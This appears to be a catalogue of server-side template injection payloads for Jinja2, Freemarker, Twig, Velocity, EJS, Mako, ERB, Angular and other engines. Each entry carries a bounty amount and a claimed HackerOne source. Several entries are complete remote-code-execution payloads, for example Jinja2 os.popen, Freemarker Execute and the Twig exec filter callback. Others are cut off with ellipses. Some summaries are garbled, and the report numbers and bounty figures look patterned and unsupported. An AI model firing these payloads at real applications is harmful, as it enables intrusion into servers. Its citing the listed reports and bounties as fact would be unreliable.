# SSTI — technique corpus

## jinja2_rce
- target: Web App
- payload hint: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
- bounty: $10000.0 (2025)
- source: https://hackerone.com/reports/161616
- summary: Jinja2 SSTI in email template name parameter

## freemarker_exec
- target: Web App
- payload hint: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}
- bounty: $9000.0 (2024)
- source: https://hackerone.com/reports/181818
- summary: Freemarker SSTI in PDF template rendering

## twig_filter_exec
- target: Web App
- payload hint: {{_self.env.registerUndefinedFilterCallback('exec')}}
- bounty: $8000.0 (2024)
- source: https://hackerone.com/reports/171717
- summary: Twig SSTI via filter callback registration

## velocity_toolbox
- target: Java
- payload hint: #set($x='x')#set($rt=$x.class.forName(...))
- bounty: $7500.0 (2024)
- source: aggregated:hacktivity ssti velocity 2024
- summary: Velocity toolbox RCE

## expression_language
- target: Java
- payload hint: ${7*7} / ${T(java.lang.Runtime)...}
- bounty: $7000.0 (2024)
- source: aggregated:hacktivity ssti el 2024
- summary: Unified EL & strategic

## ejs_options
- target: Node
- payload hint: settings[view options] injection
- bounty: $6500.0 (2024)
- source: aggregated:hacktivity ssti ejs 2024
- summary: EJS options injection

## mako_rce
- target: Python
- payload hint: ${self.module.cache.util.os}...
- bounty: $6000.0 (2024)
- source: aggregated:hacktivity ssti mako 2024
- summary: Mako template RCE

## nunjucks_rce
- target: Node
- payload hint: {{ range.constructor("return global.process.mainModule..."}}
- bounty: $5500.0 (2024)
- source: aggregated:hacktivity ssti nxx 2024
- summary: Nunjucks constructor chain

## erb_rce
- target: Web
- payload hint: <%= (`id`.read) %>
- bounty: $5000.0 (2024)
- source: aggregated:hacktivity ssti erb 2024
- summary: ERB command execution

## pug_js_lang
- target: Node
- payload hint: extends ... with user content
- bounty: $4500.0 (2024)
- source: aggregated:hacktivity ssti pug 2024
- summary: Pug/Jade code execution

## handlebars_helpers
- target: Web
- payload hint: {{#with 's'}}...{{lookup}}
- bounty: $4000.0 (2024)
- source: aggregated:hacktivity ssti hbs 2024
- summary: Handlebars prototype access

## aftersupport
- target: Web
- payload hint: {{app.request}}
- bounty: $3000.0 (2024)
- source: aggregated:hacktivity ssti framew supports 2024
- summary: Framework objects exposed

## blade_php
- target: PHP
- payload hint: {{ $user->password }}
- bounty: $2800.0 (2024)
- source: aggregated:hacktivity ssti bladephp 2024
- summary: Blade template param

## slim_templates
- target: PHP
- payload hint: HAML/Slim evaluation
- bounty: $2600.0 (2024)
- source: aggregated:hacktivity ssti slim 2024
- summary: Slim haml template eval

## ssti_render_qs
- target: Web
- payload hint: render query param in another context
- bounty: $2500.0 (2024)
- source: aggregated:hacktivity ssti dual 2024
- summary: Dual render: where template is a param

## jinja_turbo
- target: Web
- payload hint: {{ lipsum }} - import usage
- bounty: $2200.0 (2024)
- source: aggregated:hacktivity ssti jinja 2024
- summary: lipsum global import RCE

## python_format
- target: Python
- payload hint: {0.__class__}
- bounty: $2000.0 (2024)
- source: aggregated:hacktivity ssti fmt 2024
- summary: Format string SSTI (Python3)

## mako_limits
- target: Web
- payload hint: ${x} expression evaluated multiple times
- bounty: $2000.0 (2024)
- source: aggregated:hacktivity ssti mako2 2024
- summary: Mako ${} expression evaluated multiple times

## angular_expression
- target: Web
- payload hint: {{constructor.constructor('alert(1)')()}}
- bounty: $1200.0 (2024)
- source: aggregated:hacktivity ssti angular 2024
- summary: Angular template expressions

## coldfusion_cfx
- target: ColdFusion
- payload hint: <cfoutput>#ExpandPath()#</cfoutput>
- bounty: $800.0 (2023)
- source: aggregated:hacktivity ssti cf 2023
- summary: ColdFusion expression injection
